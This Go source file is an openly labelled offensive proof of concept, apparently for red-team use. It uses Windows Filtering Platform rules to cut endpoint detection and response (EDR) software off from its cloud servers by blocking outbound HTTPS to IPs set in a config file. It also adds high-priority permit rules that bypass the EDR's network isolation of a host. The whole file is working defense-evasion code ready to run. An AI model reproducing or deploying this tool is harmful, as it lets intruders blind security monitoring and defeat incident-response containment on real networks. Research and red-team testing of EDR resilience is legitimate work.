package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/netip"
	"os"

	"golang.org/x/sys/windows"
	"inet.af/wf"
)

type Config struct {
	Provider struct {
		Provider_name string `json:"provider_name"`
		Provider_ID   string `json:"provider_ID"`
	} `json:"provider"`
	Sublayer struct {
		Sublayer_name string `json:"sublayer_name"`
		Sublayer_ID   string `json:"sublayer_ID"`
	} `json:"sublayer"`
	Block []map[string]string `json:"Block"`
}
type BlockIP struct {
	Entry netip.Addr
}

func main() {
	// Check if the config file path is provided as an argument
	if len(os.Args) < 2 {
		fmt.Println("Usage: ", os.Args[0], " <config_file.json>")
		os.Exit(1)
	}
	// Get the config file path from command-line arguments
	configFile := os.Args[1]
	// Read the JSON file
	data, err := ioutil.ReadFile(configFile)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("[+] Starting Anti EDR with WFP filters\n")

	// Unmarshal the JSON data into a Config struct
	var config Config
	err = json.Unmarshal(data, &config)
	if err != nil {
		log.Fatal("[!] Error processing your config file\n", err)
	} else {
		fmt.Printf("[+] Config file parsed\n")
	}

	session, err := wf.New(&wf.Options{
		Name:    "EDR Offensive tool POC with WFP",
		Dynamic: true,
	})
	if err != nil {
		fmt.Println("[!] Error creating new WFP session !\n\nAre you sure to be running with privileges ?")
		log.Fatal(err)
	}

	fmt.Println("[+] Created new Session name = 'EDR Offensive tool POC WITH wfp'")

	//guidprovider, _ := windows.GenerateGUID()
	guidprovider, _ := windows.GUIDFromString(config.Provider.Provider_ID)
	providerID := wf.ProviderID(guidprovider)
	err = session.AddProvider(&wf.Provider{
		ID:         providerID,
		Name:       config.Provider.Provider_name,
		Persistent: false,
	})
	if err != nil {
		fmt.Println(err)
		fmt.Println("[!]  Seems you are in Isolation mode already !!! Failed creation of new Provider ! Continuing still ...")
		fmt.Println("")
	} else {
		fmt.Println("[+] Adding Provider name = '", config.Provider.Provider_name, "' providerID = ", guidprovider, " Persistent = false")
	}
	guid, _ := windows.GUIDFromString(config.Sublayer.Sublayer_ID)

	//guid, _ := windows.GenerateGUID()
	sublayerID := wf.SublayerID(guid)

	err = session.AddSublayer(&wf.Sublayer{
		ID:       sublayerID,
		Name:     config.Sublayer.Sublayer_name,
		Provider: providerID,
		Weight:   0xffff, // the highest possible weight

	})
	if err != nil {
		fmt.Println(err)
		fmt.Println("[!]  Seems you are in Isolation mode already !!! Failed creation of new sublayer ! Continuing still ...")
		fmt.Println("")
	} else {
		fmt.Println("[+] Adding sublayer guid = ", guid, " name = ", config.Sublayer.Sublayer_name, " Isolation weight 0xffff")
	}
	layers := []wf.LayerID{
		//wf.LayerALEAuthRecvAcceptV4,
		//wf.LayerALEAuthConnectV4,
		wf.LayerALEAuthConnectV4,
		//wf.LayerOutboundTransportV4,

	}
	var TableBlockIP []BlockIP

	for _, entry := range config.Block {
		for region, ip := range entry {
			fmt.Printf("  [+] Name: %s, IP: %s\n", region, ip)
			MyIP, err := netip.ParseAddr(ip)
			if err != nil {
				fmt.Println("[!] Error converting to an IP addresse : ", ip)
				panic(err)
			}
			NewEntry := BlockIP{MyIP}
			TableBlockIP = append(TableBlockIP, NewEntry)
		}
	}

	for _, layer := range layers {
		guid, _ := windows.GenerateGUID()
		fmt.Println("[+] Adding WFP rule to block EDR flow guid = ", guid, " name = 'EDR_BLOCKING_RULE' for layer = ", layer)
		conds := []*wf.Match{
			{
				Field: wf.FieldIPRemotePort,
				Op:    wf.MatchTypeEqual,
				Value: uint16(443), // adding filter port 443
			},
			{
				Field: wf.FieldIPProtocol,
				Op:    wf.MatchTypeEqual,
				Value: wf.IPProtoTCP, // adding filter type = TCP
			},
		}
		for _, entry := range TableBlockIP {
			conds = append(conds, &wf.Match{
				Field: wf.FieldIPRemoteAddress,
				Op:    wf.MatchTypeEqual,
				Value: entry.Entry, // adding each IP address as RemoteAddress
			})
		}
		err = session.AddRule(&wf.Rule{
			ID:         wf.RuleID(guid),
			Name:       "EDR_BLOCKING_RULE",
			Layer:      layer,
			Sublayer:   sublayerID,
			Provider:   providerID,
			Persistent: false, // no need to keep rule if process exits.
			HardAction: true,  //rule cannot be overriden except by a Veto
			Action:     wf.ActionBlock,
			Weight:     1000,
			Conditions: conds,
		})
		if err != nil {
			log.Print("ERROR: ", err)
		}
	}

	// bypassing the Isolation in case of
	isolationlayers := []wf.LayerID{
		wf.LayerALEAuthRecvAcceptV4,
		wf.LayerALEAuthConnectV4,
		wf.LayerOutboundTransportV4,
	}

	for _, layer := range isolationlayers {
		guid, _ := windows.GenerateGUID()
		fmt.Println("[+] adding WFP rule to Allow rule to bypass ISOLATION guid = ", guid, " name = 'EDR_Isolate_bypass_RULE' for layer = ", layer)
		err = session.AddRule(&wf.Rule{
			ID:         wf.RuleID(guid),
			Name:       "EDR_Isolate_bypass_RULE",
			Layer:      layer,
			Sublayer:   sublayerID,
			Provider:   providerID,
			Persistent: false, // no need to keep rule for next reboot
			HardAction: true,  //rule cannot be overriden except by a Veto
			Action:     wf.ActionPermit,
			Weight:     999,
			Conditions: []*wf.Match{
				{
					Field: wf.FieldIPProtocol,
					Op:    wf.MatchTypeEqual,
					Value: wf.IPProtoTCP,
				},
				{
					Field: wf.FieldIPProtocol,
					Op:    wf.MatchTypeEqual,
					Value: wf.IPProtoICMP,
				},
				{
					Field: wf.FieldIPProtocol,
					Op:    wf.MatchTypeEqual,
					Value: wf.IPProtoUDP,
				},
			},
		})
		if err != nil {
			log.Print("[!] ERROR: ", err)
		}
	}

	isolationICMPlayers := []wf.LayerID{
		wf.LayerOutboundICMPErrorV4,
		wf.LayerInboundICMPErrorV4,
	}

	for _, layer := range isolationICMPlayers {
		guid, _ := windows.GenerateGUID()
		fmt.Println("[+] Adding WFP rule to Allow ANY ICMPv4 guid = ", guid, " name = 'EDR_Isolate_bypass_ICMP_RULE' for layer = ", layer)
		err = session.AddRule(&wf.Rule{
			ID:         wf.RuleID(guid),
			Name:       "EDR_Isolate_bypass_ICMP_RULE",
			Layer:      layer,
			Sublayer:   sublayerID,
			Provider:   providerID,
			Persistent: false, // no need to keep rule for next reboot
			HardAction: true,  //rule cannot be overriden except by a Veto
			Action:     wf.ActionPermit,
			Weight:     999,
		})
		if err != nil {
			log.Print("[!] ERROR: ", err)
		}
	}

	fmt.Println("==> Press ENTER to finish and remove tempory WFP rules...")
	reader := bufio.NewReader(os.Stdin)
	_, _ = reader.ReadString('\n')
	fmt.Println("[+] Finished")

}